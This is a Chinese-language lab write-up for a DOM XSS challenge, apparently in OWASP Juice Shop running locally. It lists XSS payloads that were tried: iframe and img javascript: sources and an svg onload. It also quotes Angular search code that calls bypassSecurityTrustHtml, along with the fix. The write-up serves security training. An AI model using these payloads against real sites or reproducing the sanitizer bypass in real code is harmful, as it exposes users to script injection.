- DOM XSS
    - 描述：使用提供的攻击向量进行 DOM XSS
        ```html
        <iframe src="javascript:alert(`xss`)">
        ```
    - 指导教程：尝试使用搜索功能
    - 搜索 fooooooo
        - 搜索字符回显到结果页面
        - url为```http://127.0.0.1:3000/#/search?q=fooooooooo```
        - 在浏览器中查看上下文为
            ```html
            <div _ngcontent-ng-c627343222="" class="ng-star-inserted">
                <span _ngcontent-ng-c627343222="">Search Results - </span>
                <span _ngcontent-ng-c627343222="" id="searchValue">fooooooo</span>
            </div>
            ```

    - 尝试注入元素事件监听器
        ```html
        <svg onload=print()>
        ```
        - 浏览器中上下文为
            ```html
            <span _ngcontent-ng-c627343222="" id="searchValue">
                <svg onload="print()"></svg>
            </span>
            ```
        - 存在 XSS 注入，但未触发 JavaScript 事件
    - 尝试注入类似描述提示的 src 的 javascript 伪协议
        ```html
        <img src="javascript:alert(`xss`)">
        ```
        - 未触发 JavaScript 事件
    - 使用描述提示的 iframe 伪协议攻击向量
        ```html
        <iframe src="javascript:alert(`xss`)">
        ```
        - 触发弹窗
    - 作为初始漏洞提供了攻击向量，不同于通常查看 JavaScript 代码确定源与汇的 DOM XSS。代码存在于```/main.js```文件中
- 编程挑战
    ```typescript
	filterTable () {
	    let queryParam: string = this.route.snapshot.queryParams.q
	    if (queryParam) {
	      queryParam = queryParam.trim()
	      this.dataSource.filter = queryParam.toLowerCase()
	      this.searchValue = this.sanitizer.bypassSecurityTrustHtml(queryParam)
	      this.gridDataSource.subscribe((result: any) => {
	        if (result.length === 0) {
	          this.emptyState = true
	        } else {
	          this.emptyState = false
	        }
	      })
	    } else {
	      this.dataSource.filter = ''
	      this.searchValue = undefined
	      this.emptyState = false
	    }
	}
    ```
    - 代码漏洞函数使用了很直白的名字 
        ```typescript
        this.searchValue = this.sanitizer.bypassSecurityTrustHtml(queryParam)
        ```
    - 修复，删除绕过输入的函数
        ```typescript
        this.searchValue = queryParam
        ```
        其他修复选项均为同样直白的```bypassSecurityTrustXX```
    - Angular 框架 DomSanitizer 服务的```bypassSecurityTrustHtml```函数
        > 绕过安全检查，并信任给定的值是一个安全的 HTML。  
    - 检查输入而不是绕过